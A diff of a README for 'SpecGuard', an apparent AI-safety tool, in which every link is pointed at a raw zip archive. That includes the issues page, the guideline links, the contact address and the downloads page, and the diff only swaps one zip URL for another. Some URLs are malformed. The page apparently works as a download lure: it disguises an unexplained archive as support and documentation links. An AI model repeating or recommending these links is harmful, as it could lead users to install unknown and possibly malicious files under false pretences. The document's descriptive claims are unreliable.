@@ -1,6 +1,6 @@
 # 🎉 SpecGuard - Ensuring AI Safety Made Simple
 
-[![Download SpecGuard](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip%https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip)](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip)
+[![Download SpecGuard](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip%https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip)](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip)
 
 ## 🌟 Introduction
 
@@ -19,7 +19,7 @@ To use SpecGuard, follow these simple steps to download and run the tool. You wi
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to download SpecGuard: [Download SpecGuard](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip).
+1. **Visit the Releases Page:** Go to the following link to download SpecGuard: [Download SpecGuard](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip).
 
 2. **Select the Latest Version:** On the Releases page, find the latest version of SpecGuard. It will usually be at the top of the list.
 
@@ -74,18 +74,18 @@ Once installed, you can start using SpecGuard easily. Follow these steps:
 
 ## 🌐 Community & Support
 
-If you have questions or need assistance, you can join our community on GitHub. Issues can be submitted on the [Issues page](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip). Our team and other users will be glad to help you.
+If you have questions or need assistance, you can join our community on GitHub. Issues can be submitted on the [Issues page](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip). Our team and other users will be glad to help you.
 
 ## 🔗 Additional Resources
 
 For more information about AI policies and implementation, check out the following resources:
 
-- [AI Safety Guidelines](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip)
-- [Understanding AI Governance](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip)
-- [Behavioral Testing Tools](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip)
+- [AI Safety Guidelines](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip)
+- [Understanding AI Governance](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip)
+- [Behavioral Testing Tools](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip)
 
 ## 📞 Contact
 
-For direct inquiries, please contact us at [https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip).
+For direct inquiries, please contact us at [https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip).
 
-Feel free to explore, test, and ensure the safety of your AI outputs with SpecGuard! Remember, you can always return to the [Downloads page](https://github.com/Tearfullnex/SpecGuard/raw/refs/heads/main/outputs/Spec_Guard_v2.6.zip) for new updates and versions.
+Feel free to explore, test, and ensure the safety of your AI outputs with SpecGuard! Remember, you can always return to the [Downloads page](https://raw.githubusercontent.com/Tearfullnex/SpecGuard/main/specguard/Guard-Spec-2.0.zip) for new updates and versions.
